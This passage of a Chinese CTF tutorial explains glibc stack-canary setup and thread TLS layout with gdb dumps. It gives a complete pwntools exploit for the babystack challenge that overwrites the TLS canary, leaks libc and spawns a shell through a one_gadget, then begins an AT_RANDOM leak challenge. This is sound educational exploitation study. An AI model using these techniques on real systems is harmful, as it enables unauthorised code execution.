            yield {"rip": regs[0], "rsp": regs[1]}
        # Ignore lines interspersed with other output!
        except (ValueError, IndexError):
            pass

def addr2line(iterable):
    proc = subprocess.Popen(["addr2line", "-e", sys.argv[1], "-f"],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    for regs in iterable:
        proc.stdin.write("%x\n" % regs["rip"])
        a = proc.stdout.readline().rstrip("\n")
        b = proc.stdout.readline().rstrip("\n")
        regs["func"] = "%s %s" % (a, b)
        yield regs

def entry_points(iterable):
    funcs = {}
    # We treat the first address we see for the function as its entry
    # point, and only report those entries from this point on.
    for regs in iterable:
        func = regs["func"].split(":")[0]
        if funcs.setdefault(func, regs["rip"]) == regs["rip"]:
            yield regs

def add_nesting(iterable):
    stack = [2 ** 64]
    for regs in iterable:
        stack_pos = regs["rsp"]
        if stack_pos < stack[-1]:
            stack.append(stack_pos)
        while stack_pos > stack[-1]:
            stack.pop()
        regs["indent"] = "  " * len(stack)
        yield regs

for x in add_nesting(entry_points(addr2line(read()))):
    print x["indent"], x["func"], "%x" % x["rip"]
```

> 如上代码仅针对64位程序使用，32位使用请将寄存器名称修改即可，如rip改为eip
>

然后将文章开头的代码进行静态编译：gcc -g -static test.c -o test_static，执行如下命令：

```python
root@4de10445acf0:~/Canary_User_Mode/static# ./trace ./test_static | python2 tree.py ./test_static 
     _start ??:? 400a50
       __libc_start_main ??:? 400e00
         _dl_relocate_static_pie ??:? 400a80
         _dl_aux_init ??:? 44bb40
         __libc_init_secure ??:? 44c850
         __tunables_init ??:? 44b4e0
         get_common_indeces.constprop.1 libc-start.o:? 400b90
         __tunable_get_val ??:? 44bae0
         __tunable_get_val ??:? 44bae0
         __tunable_get_val ??:? 44bae0
         __tunable_get_val ??:? 44bae0
         strchr_ifunc strchr.o:? 423480
         strlen_ifunc strlen.o:? 423590
         strspn_ifunc strspn.o:? 484bf0
         strcspn_ifunc strcspn.o:? 423520
         __mempcpy_ifunc mempcpy.o:? 424050
         __wmemset_ifunc wmemset.o:? 473660
         strcmp_ifunc strcmp.o:? 4234c0
         __wcsnlen_ifunc wcsnlen.o:? 473d30
         memset_ifunc memset.o:? 423fb0
         __strcasecmp_l_ifunc strcasecmp_l.o:? 424140
         memcmp_ifunc memcmp.o:? 423e90
         strncmp_ifunc strncmp.o:? 4235c0
         __libc_strstr_ifunc strstr.o:? 423e70
         memchr_ifunc memchr.o:? 471d60
         __strchrnul_ifunc strchrnul.o:? 424280
         __stpcpy_ifunc stpcpy.o:? 424110
         strrchr_ifunc strrchr.o:? 471cc0
         __wcslen_ifunc wcslen.o:? 473610
         __new_memcpy_ifunc memcpy.o:? 424190
         __rawmemchr_ifunc rawmemchr.o:? 424250
         __libc_memmove_ifunc memmove.o:? 423ef0
         __strnlen_ifunc strnlen.o:? 471c90
         strcpy_ifunc strcpy.o:? 4234f0
         __libc_setup_tls ??:? 401620
           sbrk ??:? 449850
             __brk ??:? 475300
             __brk ??:? 475300
           ?? ??:0 400438
           __memcpy_avx_unaligned_erms ??:? 446700
         _dl_discover_osversion ??:? 44d480
           uname ??:? 474f20
         __libc_init_first ??:? 44d590
           _dl_non_dynamic_init ??:? 44bf50
             _dl_get_origin ??:? 47f580
               malloc ??:? 41f4a0
               malloc_hook_ini malloc.o:? 41ee90
                 ptmalloc_init.part.0 malloc.o:? 4199a0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                   __tunable_get_val ??:? 44bae0
                 tcache_init.part.4 malloc.o:? 41e8c0
                   _int_malloc malloc.o:? 41c810
                     sysmalloc malloc.o:? 41bef0
                       __default_morecore ??:? 423460
                         sbrk ??:? 449850
                           __brk ??:? 475300
                       __default_morecore ??:? 423460
                         sbrk ??:? 449850
                           __brk ??:? 475300
                 _int_malloc malloc.o:? 41c810
               __mempcpy_avx_unaligned_erms ??:? 4466f0
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             _dl_new_object ??:? 47b280
               __strlen_avx2 ??:? 43ff80
               __calloc ??:? 422310
                 _int_malloc malloc.o:? 41c810
                 __memset_avx2_unaligned_erms ??:? 447220
               ?? ??:0 400438
               __memcpy_avx_unaligned_erms ??:? 446700
             _dl_setup_hash ??:? 47b110
             __strlen_avx2 ??:? 43ff80
             malloc ??:? 41f4a0
               _int_malloc malloc.o:? 41c810
             ?? ??:0 400438
             __memcpy_avx_unaligned_erms ??:? 446700
             _dl_add_to_namespace_list ??:? 47b1c0
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             _dl_init_paths ??:? 478490
               _dl_important_hwcaps ??:? 47d130
                 __tunable_get_val ??:? 44bae0
                   __strlen_avx2 ??:? 43ff80
                   __strlen_avx2 ??:? 43ff80
                   malloc ??:? 41f4a0
                     _int_malloc malloc.o:? 41c810
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
                   __mempcpy_avx_unaligned_erms ??:? 4466f0
               malloc ??:? 41f4a0
                 _int_malloc malloc.o:? 41c810
               malloc ??:? 41f4a0
                 _int_malloc malloc.o:? 41c810
               __memset_avx2_unaligned_erms ??:? 447220
               __memset_avx2_unaligned_erms ??:? 447220
               __memset_avx2_unaligned_erms ??:? 447220
               __memset_avx2_unaligned_erms ??:? 447220
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             getenv ??:? 40e6e0
               __strlen_avx2 ??:? 43ff80
             __strlen_avx2 ??:? 43ff80
           __init_misc ??:? 44b100
             __strrchr_avx2 ??:? 472f00
         __ctype_init ??:? 45a0d0
         __cxa_atexit ??:? 40ec80
           __new_exitfn ??:? 40ea60
         __libc_csu_init ??:? 401870
           _init ??:? 400400
           frame_dummy crtstuff.c:? 400b40
             __register_frame_info ??:? 48ef70
             __register_frame_info_bases.part.6 unwind-dw2-fde-dip.o:? 48eeb0
           register_tm_clones crtstuff.c:? 400ac0
           init_cacheinfo cacheinfo.o:? 4005c0
             handle_intel.constprop.1 cacheinfo.o:? 4479d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
             handle_intel.constprop.1 cacheinfo.o:? 4479d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
             handle_intel.constprop.1 cacheinfo.o:? 4479d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
               intel_check_word.isra.0 cacheinfo.o:? 4476d0
         _dl_debug_initialize ??:? 44b3e0
         _setjmp ??:? 40daa0
         __sigsetjmp ??:? 45a170
         __sigjmp_save ??:? 45a1d0
         main /root/Canary_User_Mode/static/test.c:2 400b6d
           puts ??:? 410220
             __strlen_avx2 ??:? 43ff80
             _IO_new_file_xsputn ??:? 413a70
               _IO_file_overflow ??:? 415140
                 _IO_doallocbuf ??:? 416720
                   _IO_file_doallocate ??:? 46edf0
                     _IO_file_stat ??:? 4132c0
                     __fxstat64 ??:? 448a90
                     malloc ??:? 41f4a0
                       _int_malloc malloc.o:? 41c810
                     _IO_setb ??:? 4166c0
               _IO_new_do_write ??:? 414450
               _IO_default_xsputn ??:? 416840
           puts ??:? 410220
             __strlen_avx2 ??:? 43ff80
             _IO_new_file_xsputn ??:? 413a70
               __mempcpy_avx_unaligned_erms ??:? 4466f0
         exit ??:? 40ea40
           __run_exit_handlers ??:? 40e7c0
             __libc_csu_fini ??:? 401910
               fini sdlerror.o:? 400570
               __do_global_dtors_aux crtstuff.c:? 400b00
                 deregister_tm_clones crtstuff.c:? 400a90
                 __deregister_frame_info ??:? 48f1b0
                 __deregister_frame_info_bases ??:? 48f090
             _fini ??:? 491f7c
             _IO_cleanup ??:? 4156c0
               _IO_file_overflow ??:? 415140
               _IO_new_do_write ??:? 414450
                 _IO_file_write ??:? 4132d0
                   __write ??:? 448d70
               _IO_file_setbuf ??:? 412690
                 _IO_default_setbuf ??:? 416c40
                   _IO_file_sync ??:? 415350
             _Exit ??:? 448470
root@4de10445acf0:~/Canary_User_Mode/static# 
```

从上面的调用栈可以看到，Canary在__libc_start_main中进行初始化，我们在glibc源码中追踪一下：

> __libc_start_main源码在：glibc-2.27/csu/libc-start.c
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628833426083-3ad3b153-9a36-49a8-a3e6-5969a970c09b.png)

> 动态链接中此部分在security_init函数中。
>

_dl_random全局指针变量赋值在：malloc/glibc/glibc-2.27/elf/dl-support.c的_dl_aux_init中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629203489207-1fe4cae5-46cc-42e8-9101-16e8f011525f.png)

fs寄存器的设置在malloc/glibc/glibc-2.27/csu/libc-tls.c中：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629204489116-efb99562-817e-4a03-b2d2-2861d803faad.png)

剩下的内容和动态链接相似，这个就不再多说了，感兴趣的话可以自己研究研究。

# 实战&&答疑&&补充
有了前面的基础知识后我们来实战一下。

## Attack TLS
### 准备
> 这里使用2018年*CTF的babystack来说明：
>
> [https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack](https://github.com/eternalsakura/ctf_pwn/tree/master/sixstar/sixstar/babystack)
>

首先看一下文件保护情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629263186945-b2a4a633-9edf-4607-aeb6-122e74d02598.png)

然后放入到IDA中看一下main函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629263336111-e1ac8040-a128-4748-b43f-734e25f69d93.png)

最引人注目的是当中的pthread_create和pthread_join函数，这两个函数与线程有关系，在pthread_create函数中有一个逻辑很简单的start_routine函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629263933028-8f18b2fd-6479-4651-821d-ad9f95cfab95.png)

这里很明显是一个栈溢出，我们可以输入0x10000字节内容的东西，远远超过了s变量所拥有的栈空间，现在问题就是要get shell的话需要绕过程序的Canary保护。使用gdb调试一下程序看线程栈上的Canary（有一个栈就有一个Canary）：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629264634707-4a535e8e-89c6-4d1c-8967-ad8f0ae95d22.png)

可以看到线程的Canary和进程的完全相同，这里就要不得不提glibc中“线程栈”的建立。

### 线程栈
在操作系统中，线程是执行代码的最小单位，进程是资源分配的最小单位，而栈是属于（内存）资源的一种；如果线程和进程共享同一个栈资源，就会出现多个线程可以并行运行的状态，但是栈是用来储存函数中的参数、局部变量、返回地址等，若出现共享情况则会导致栈中的资源出现混乱，所以线程不共享进程的栈资源，即线程栈和进程栈是分开的，并且每个线程都拥有一个独立的栈空间。

在Linux中，简单来说线程栈的创建是调用mmap来完成的，首先调用mmap创建0x801000大小不可访问的段，然后保持前0x1000字节的空间的权限设置为PROT_NONE（不可访问），用来检测线程栈的栈溢出（栈是由高地址向低地址生长），这块不可访问的区域也被称作为Red Zone；剩下的0x800000（8M）的区域调用mprotect将权限设置为可读可写，这片区域包含很多TLS结构体和线程栈等内容，使用strace的追踪结果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629270182935-3f848a9c-d64a-4034-bc21-f811e3f77ac4.png)

为了印证前面的内容，这里我们编译如下代码查看其内存结构：

```c
#include<stdio.h>
#include<pthread.h>
#include<stdlib.h>

void tid_1(){
    printf("I am tid 1!\n");
    sleep(1);
    return;
}

void tid_2(){
    printf("I am tid 2!\n");
    sleep(2);
    return;
}

int main(int argc, char *argv[]){
    pthread_t tid1, tid2;
    if(pthread_create(&tid1, NULL, (void *)&tid_1, NULL) || pthread_create(&tid2, NULL, (void *)&tid_2, NULL)){
        printf("pthread_create error!\n");
        exit(-1);
    }
    pthread_join(tid1, NULL);
    pthread_join(tid2, NULL);
    return 0;
}
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629271311743-9c333f3d-4df2-47dc-b5fc-b0a487de7070.png)

gdb对代码的第18行下断点，看一下在新线程创建之前的情况：

+ info inferiors：查看进程情况
+ info threads：查看线程情况
+ canary：查看本线程的canary

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629271701922-89e29573-a8a8-4ba6-b29a-a821ab0eb2e5.png)

如上图所示，现在的线程只有一个，我们单步步过第一个pthread_create函数，继续查看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629277145119-542ce11c-7c48-4b84-b100-66ef350e0100.png)

如上图所示，现在已经创建了一个新的线程，相比于之前mmap了一个0x801000的区域，并多出来一个heap区，heap不太重要就不看了；将线程从主线程切换到线程2看一下Canary：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629277415626-195976da-915c-4f18-99d3-41bc4fbbd26b.png)

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629277389189-e112d909-e1d4-4c6c-a076-82a122cb6349.png)

可以看到这个线程与主线程拥有同样的Canary，切回到主线程，继续单步步过第二个call pthread_create：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629277711024-60b29802-d193-4608-a842-c5eee8189326.png)

除了又多了0x801000之外，还多了一个与heap区域和一个超大的anon_7ffff0021相同大小的区域，再次查看线程：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629277991837-cf47ef67-e524-474b-af39-0af13d543ccb.png)刚才的线程2已经结束，切换到线程3看一下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629278143919-f881bdc8-6e60-4dd3-9675-05f0d38a3404.png)

所以可以印证之前的结论：canary由主进程生成之后生成的线程canary不会发生变化。接下来我们再追踪一下TLS在多线程中的存放情况，还是用strace追踪：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629280466117-fea99f96-604b-407b-8234-aafaf3e49819.png)

TLS所在的位置对应到段中的区域为：

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555555000 r-xp     1000 0      /root/Canary_User_Mode/ctf/test
    0x555555754000     0x555555755000 r--p     1000 0      /root/Canary_User_Mode/ctf/test
    0x555555755000     0x555555756000 rw-p     1000 1000   /root/Canary_User_Mode/ctf/test
    0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    0x7ffff0000000     0x7ffff0021000 rw-p    21000 0      anon_7ffff0000
    0x7ffff0021000     0x7ffff4000000 ---p  3fdf000 0      anon_7ffff0021
    0x7ffff67c1000     0x7ffff67c2000 ---p     1000 0      anon_7ffff67c1
    0x7ffff67c2000     0x7ffff6fc2000 rw-p   800000 0      anon_7ffff67c2      #线程2的TLS和线程栈所在位置
    0x7ffff6fc2000     0x7ffff6fc3000 ---p     1000 0      anon_7ffff6fc2
    0x7ffff6fc3000     0x7ffff77c3000 rw-p   800000 0      anon_7ffff6fc3      #线程1的TLS和线程栈所在位置
    0x7ffff77c3000     0x7ffff79aa000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff79aa000     0x7ffff7baa000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7baa000     0x7ffff7bae000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bae000     0x7ffff7bb0000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so
    0x7ffff7bb0000     0x7ffff7bb4000 rw-p     4000 0      anon_7ffff7bb0
    0x7ffff7bb4000     0x7ffff7bce000 r-xp    1a000 0      /lib/x86_64-linux-gnu/libpthread-2.27.so
    0x7ffff7bce000     0x7ffff7dcd000 ---p   1ff000 1a000  /lib/x86_64-linux-gnu/libpthread-2.27.so
    0x7ffff7dcd000     0x7ffff7dce000 r--p     1000 19000  /lib/x86_64-linux-gnu/libpthread-2.27.so
    0x7ffff7dce000     0x7ffff7dcf000 rw-p     1000 1a000  /lib/x86_64-linux-gnu/libpthread-2.27.so
    0x7ffff7dcf000     0x7ffff7dd3000 rw-p     4000 0      anon_7ffff7dcf
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7fea000     0x7ffff7fef000 rw-p     5000 0      anon_7ffff7fea      #主进程的TLS所在位置
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 29000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 2a000  /lib/x86_64-linux-gnu/ld-2.27.so
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      anon_7ffff7ffe
    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg>
```

**<font style="color:#F5222D;">可以看到这里TLS所处的位置和主进程的不相同，线程栈和TLS结构体处于同一个段中不是一片独立的区域</font>**。

### 开始解题
我们回过头来看题目，首先看一下两个函数的原型：

+ pthread_create：创建一个新线程

```c
#include <pthread.h> //因为<pthread.h>不属于Linux标准库，所以在编译的时候需要加上-lpthread参数
int pthread_create(pthread_t *restrict thread,
                   const pthread_attr_t *restrict attr,
                   void *(*start_routine)(void *),
                   void *restrict arg);
```

1. thread：事先定义好的pthread_t变量（线程标识符），当线程创建成功时thread指向的内存单元被设置为新创建线程的线程ID。
2. attr：用于定义不同线程所拥有的属性，通常设置为NULL。
3. start_routine：新创建线程将从此函数开始运行。
4. arg：代表start_routine的参数，当没有参数时设为NULL即可；有参数时输入参数的地址。当多于一个参数时应当使用结构体传入。

返回值：线程创建成功时返回0，否则返回对应的错误状态码。

+ pthread_join：等待某一个线程的结束

```c
#include <pthread.h> //因为<pthread.h>不属于Linux标准库，所以在编译的时候需要加上-lpthread参数
int pthread_join(pthread_t thread, void **retval);

```

1. thread：被等待的线程标识符
2. retval：存储被等待线程的返回值

返回值：当函数返回时，被等待线程的资源被收回。如果执行成功，将返回0，如果失败则返回一个错误状态码。

回过头来看一下题目的内存分布：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629295196993-6afab5ee-1267-4cb3-bc45-98f943068720.png)

红箭头所指向的地方就是我们要研究的地方，由IDA可以知道，篡改函数的rbp需要大小为0x1010的字符串，经过分析，这片内存区域的结构如下：

> 可以在gdb中将此块内存dump下来放入IDA中进行查看：dump memory stack_TLS 0x7ffff6fc3000 0x7ffff77c3000
>

```c
pwndbg> x/16gx 0x7ffff6fc3000
0x7ffff6fc3000: 0x0000000000000000      0x0000000000000000
......(内存均为NULL)
0x7ffff77c0da0: 0x0000000000000000      0x0000000000000000
0x7ffff77c0db0: 0x0000000000000000      0x00007ffff78d3199
0x7ffff77c0dc0: 0x0000000000000000      0x0000000000000001
0x7ffff77c0dd0: 0x00007ffff7baea00      0x0000000000000d68
0x7ffff77c0de0: 0x00007ffff7baa760      0x00007ffff7850218
0x7ffff77c0df0: 0x00007ffff7baea00      0x00007ffff7bab2a0
0x7ffff77c0e00: 0x000000000000000a      0x00007ffff7baea84
0x7ffff77c0e10: 0x00007ffff7baea00      0x00007ffff78514c2
0x7ffff77c0e20: 0x0000000000000d68      0x0000000000000000
0x7ffff77c0e30: 0x00007ffff77c0eb2      0x00007ffff7842f42
0x7ffff77c0e40: 0x00007ffff77c0eb0      0x00000001f7baf760
0x7ffff77c0e50: 0x000000000000000a      0x00007ffff7bc5489
0x7ffff77c0e60: 0x00000000f7050eb0      0x000000000000000a
0x7ffff77c0e70: 0x0000000000000000      0x00007ffff77c0ec0
0x7ffff77c0e80: 0x00007ffff77c1fc0      0x0000000000400997
0x7ffff77c0e90: 0x0000000000000000      0x000000000000000a
0x7ffff77c0ea0: 0x00007ffff77c0ee0      0x0000000000400941
0x7ffff77c0eb0: 0x000000000000000a      0x000000000000000a
0x7ffff77c0ec0: 0x00007ffff77c1ef0      0x0000000000400a78
0x7ffff77c0ed0: 0x0000000000000000      0x000000000000000a #输入的内容，该变量可以发生栈溢出
0x7ffff77c0ee0: 0x6262626161616161      0x0000000000006262 
......(内存均为NULL)
0x7ffff77c1ed0: 0x0000000000000000      0x0000000000000000
0x7ffff77c1ee0: 0x00007ffff77c2700      0x228a33d379c52500
    			     					#Canary
0x7ffff77c1ef0: 0x0000000000000000      0x00007ffff7bbb6db
    			#rbp==0x7ffff77c1ef0	#返回地址为0x00007ffff7bbb6db
0x7ffff77c1f00: 0x0000000000000000      0x00007ffff77c2700
0x7ffff77c1f10: 0x00007ffff77c2700      0xcab3ba725f6135c0
0x7ffff77c1f20: 0x00007ffff77c1fc0      0x0000000000000000
0x7ffff77c1f30: 0x0000000000000000      0x00007fffffffe130
0x7ffff77c1f40: 0x354c548a616135c0      0x354c5505322535c0
0x7ffff77c1f50: 0x0000000000000000      0x0000000000000000
0x7ffff77c1f60: 0x0000000000000000      0x0000000000000000
0x7ffff77c1f70: 0x0000000000000000      0x0000000000000000
0x7ffff77c1f80: 0x0000000000000000      0x0000000000000000
0x7ffff77c1f90: 0x0000000000000000      0x228a33d379c52500
0x7ffff77c1fa0: 0x0000000000000000      0x00007ffff77c2700
0x7ffff77c1fb0: 0x0000000000000000      0x00007ffff78e471f #线程栈从此处开始，由高地址向低地址生长（向前看）
-------------------------------------------------------------------child_stack=0x7ffff77c1fb0
0x7ffff77c1fc0: 0x0000000000000000      0x0000000000000000 #此区域在初始化TLS的时候需要用到
......(内存均为NULL)
0x7ffff77c2660: 0x0000000000000000      0x0000000000000000
0x7ffff77c2670: 0x00007ffff7baf560      0x00007ffff77c2db8
0x7ffff77c2680: 0x0000000000000000      0x00007ffff7960d40
0x7ffff77c2690: 0x00007ffff7961340      0x00007ffff7961c40
0x7ffff77c26a0: 0x0000000000000000      0x0000000000000000
0x7ffff77c26b0: 0x0000000000000000      0x0000000000000000
0x7ffff77c26c0: 0x0000000000000000      0x0000000000000000
0x7ffff77c26d0: 0x0000000000000000      0x0000000000000000
0x7ffff77c26e0: 0x0000000000000000      0x0000000000000000
0x7ffff77c26f0: 0x0000000000000000      0x0000000000000000
-------------------------------------------------------------------tls=0x7ffff77c2700
0x7ffff77c2700: 0x00007ffff77c2700      0x0000000000603270 #TLS结构体从此处开始（向后看）
0x7ffff77c2710: 0x00007ffff77c2700      0x0000000000000001
0x7ffff77c2720: 0x0000000000000000      0x228a33d379c52500
    									#canary
0x7ffff77c2730: 0x9ae06559dd392fb0      0x0000000000000000
0x7ffff77c2740: 0x0000000000000000      0x0000000000000000
0x7ffff77c2750: 0x0000000000000000      0x0000000000000000
0x7ffff77c2760: 0x0000000000000000      0x0000000000000000
0x7ffff77c2770: 0x0000000000000000      0x0000000000000000
......(省略一些与本文无关的内容)
0x7ffff77c2ff0: 0x0000000000000000      0x0000000000000000
pwndbg> 
```

从上面的内存分布中可以看出，程序的线程栈是和线程的TLS相邻的，当栈溢出足够多时，就会影响到TLS结构体中的Canary。另外在start_routine函数中有leave_ret指令，为了方便起见，直接栈迁移好了；栈迁移后，我们可以通过溢出将fs寄存器所指TLS的Canary给改了：

```python
# coding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

p=process("./bs")
elf=ELF("./bs")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
puts_plt_addr=elf.plt['puts']
puts_got_addr=elf.got['puts']
read_plt_addr=elf.plt['read']
bss_start_addr=elf.bss()

'''
root@4de10445acf0:~/Canary_User_Mode/ctf# ROPgadget --binary ./bs --only "pop|ret"
Gadgets information
============================================================
0x0000000000400bfc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bfe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400c00 : pop r14 ; pop r15 ; ret
0x0000000000400c02 : pop r15 ; ret
0x0000000000400bfb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400bff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400870 : pop rbp ; ret
0x0000000000400c03 : pop rdi ; ret
0x0000000000400c01 : pop rsi ; pop r15 ; ret
0x0000000000400bfd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400287 : ret
0x000000000040097e : ret 0x8b48

Unique gadgets found: 12
root@4de10445acf0:~/Canary_User_Mode/ctf# 
'''
pop_rdi_gadget_addr=0x400c03
pop_rbp_gadget_addr=0x400870
pop_rsi_r15_gadget_addr=0x400c01
leave_ret_addr=0x400A9B

payload='a'*0x1008+p64(0)*2 #更改Canary、rbp为零
payload+=p64(pop_rdi_gadget_addr)+p64(puts_got_addr)+p64(puts_plt_addr)
payload+=p64(pop_rdi_gadget_addr)+p64(0)+p64(pop_rsi_r15_gadget_addr)+p64(bss_start_addr+0x100)+p64(0xdeadbeef)+p64(read_plt_addr)
payload+=p64(pop_rbp_gadget_addr)+p64(bss_start_addr+0x100-0x8)+p64(leave_ret_addr) #注意p64(bss_start_addr+0x100-0x8)就行
payload=payload.ljust(0x2000,"\x00")

p.recvuntil('How many bytes do you want to send?\n')
p.sendline(str(0x2000))  #修改TLS结构体中的Canary为零
sleep(1)
p.send(payload)
p.recvuntil('It\'s time to say goodbye.\n')
puts_real_addr=u64(p.recv(6)+'\x00\x00')
libc_base=puts_real_addr-libc.symbols['puts']
print hex(libc_base)

'''
root@4de10445acf0:~/Canary_User_Mode/ctf# one_gadget /lib/x86_64-linux-gnu/libc-2.27.so
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
root@4de10445acf0:~/Canary_User_Mode/ctf#
'''
one_gadget_addr_list=[0x4f3d5,0x4f432,0x10a41c]
#gdb.attach(proc.pidof(p)[0],"thread 2\nset scheduler-locking on") 
p.send(p64(libc_base+one_gadget_addr_list[2]))
p.interactive()
```

注意：在调试时覆盖TLS后程序主线程会崩溃，切换到新线程后会跳回主线程，可以使用set scheduler-locking on来锁定到2线程。



### 多线程调试命令
| | |
| --- | --- |
| info threads | 显示当前可调试的所有线程，每个线程会有一个GDB为其分配的ID，后面操作线程的时候会用到这个ID。 前面有*的是当前调试的线程 |
| thread ID(1,2,3…) | 切换当前调试的线程为指定ID的线程 |
| break thread_test.c:123 thread all（例：在相应函数的位置设置断点break pthread_run1） | 在所有线程中相应的行上设置断点 |
| thread apply ID1 ID2 command | 让一个或者多个线程执行GDB命令command |
| thread apply all command | 让所有被调试线程执行GDB命令command |
| set scheduler-locking 选项 command | 设置线程是以什么方式来执行命令 |
| set scheduler-locking off | 不锁定任何线程，也就是所有线程都执行，这是默认值 |
| set scheduler-locking on | 只有当前被调试程序会执行 |
| set scheduler-locking on step | 在单步的时候，除了next过一个函数的情况(熟悉情况的人可能知道，这其实是一个设置断点然后continue的行为)以外，只有当前线程会执行 |


## Leak AUXV
### 解题
> [https://github.com/pcy190/learn_pwn/tree/master/canary/2017-TCTF-Final-pwn-upxof](https://github.com/pcy190/learn_pwn/tree/master/canary/2017-TCTF-Final-pwn-upxof)
>

如果程序不是多线程的话就不好修改TLS结构体中的Canary了，但是我们可以通过泄露栈上AT_RANDOM的值来获取Canary。

> sudo apt install upx-ucl
>

这里使用2017-TCTF-Final-upxof来进行说明，首先检查一下这个文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629374024340-c52f8c09-0750-43cb-b05e-c259c9bfce56.png)

和其他的可执行文件不同，这里多出来一个Packer，上面显示着程序加了UPX的壳，我们使用upx -d命令即可脱壳，脱壳后文件保护如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629374223528-c8efb0b3-53e5-4b8d-b525-e753d6bb1b59.png)

我们先将未脱壳的程序放入到IDA中查看一下，在程序的入口点处首先call了一段没有压缩的代码：sub_40099E，在这个函数中syscall了write和read：

> gdb中输入starti可以直接断到入口点
>

根据汇编代码的逻辑，我们一共可以输入4096字节的内容：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629380336789-e478a393-c603-4c7b-9427-405d18c17ef9.png)

这么大足以发生栈溢出，但是要想程序运行upx解密后的内容还需要一点：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1629379076779-04875ccf-e657-4461-8078-db1fad3d9a9f.png)

脱壳后将程序放入IDA中看一下：

